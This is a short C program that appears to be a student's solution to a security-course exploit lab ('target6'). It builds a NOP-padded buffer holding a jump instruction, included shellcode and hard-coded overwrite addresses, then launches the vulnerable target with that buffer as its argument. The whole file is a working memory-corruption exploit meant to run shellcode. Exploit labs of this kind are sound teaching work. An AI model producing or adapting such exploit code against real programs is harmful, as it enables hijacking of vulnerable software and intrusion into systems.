#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target6"
#define NOP 0x90
int main(void)
{
  char *args[3];
  char *env[1];

  char buf[192];
  memset(buf,NOP,192);
  char part1[] = "\xeb\x25\x90\x90\x91\x90\x90\x90";
  memcpy(buf,part1,strlen(part1));
  memcpy(buf+strlen(part1),shellcode+2,strlen(shellcode)-2);
  //memcpy(buf+strlen(shellcode)+ 6 + 4 - (strlen(shellcode)+6)%4 + 4, "\x69\xfe\x21\x20", 4);
  memcpy(buf+72, "\x28\xee\x04\x01\x68\xfe\x21\x20", 8);
  args[0] = TARGET; args[1] = buf; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
